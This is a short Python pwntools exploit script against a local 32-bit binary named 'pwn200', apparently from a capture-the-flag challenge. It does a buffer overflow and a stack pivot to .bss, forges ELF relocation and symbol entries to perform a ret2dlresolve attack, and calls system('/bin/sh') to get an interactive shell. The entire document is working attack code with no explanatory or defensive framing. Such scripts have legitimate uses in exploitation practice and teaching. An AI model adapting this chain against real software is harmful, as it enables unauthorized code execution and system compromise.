from pwn import *
context.arch="i386"
elf = ELF('./pwn200')
gadget = lambda x: next(elf.search(asm(x, os='linux', arch='i386')))

p = process('./pwn200')

# 0x8049165
stack_privot  = gadget("leave; ret")

bss = 0x0804c028+0x600 - 8
read_plt = 0x080490A4

p.send(b"A"*108 + b''.join(p32(i) for i in [bss, # ebp
                                            read_plt,  # call read
                                            stack_privot, # leave; ret
                                            0, bss, 0x400
                                            ]))
# esp = rop_chain + 4
# write2esp



ELF32_sym = 0x8048248
r_info =  (((bss + 0x200 + 8 - ELF32_sym))//0x10)*0x100 + 0x7
fake_Elf32_Rel = b''.join(p32(i) for i in [
    0x0804c028, # fake
    r_info
])
print(f"fake_Elf32_Rel.r_info = {hex(r_info)}")

dynstr = 0x80482e8
st_name = bss + 0x200 + len(fake_Elf32_Rel) + 16 - dynstr
fake_Elf32_Sym=b''.join(p32(i) for i in [
    st_name,
    0,
    0,
]) + p8(0x12) + p8(0) + p16(0)
print(f"fake_Elf32_Sym.st_name = {hex(st_name)}")

strings = b"system\x00/bin/sh\x00\x00"

rel_plt = 0x080483a0
resolve_plt = 0x8049030

fake_rel_offset = bss + 0x200 - rel_plt
fake_bin_sh = bss + 0x200 + len(fake_Elf32_Rel) + len(fake_Elf32_Sym) + 7

rop_chain = b''.join(p32(i) for i in [0, resolve_plt, fake_rel_offset, 0, fake_bin_sh]).ljust(0x200, b'\x00')

p.send(rop_chain + fake_Elf32_Rel + fake_Elf32_Sym + strings)
p.interactive()
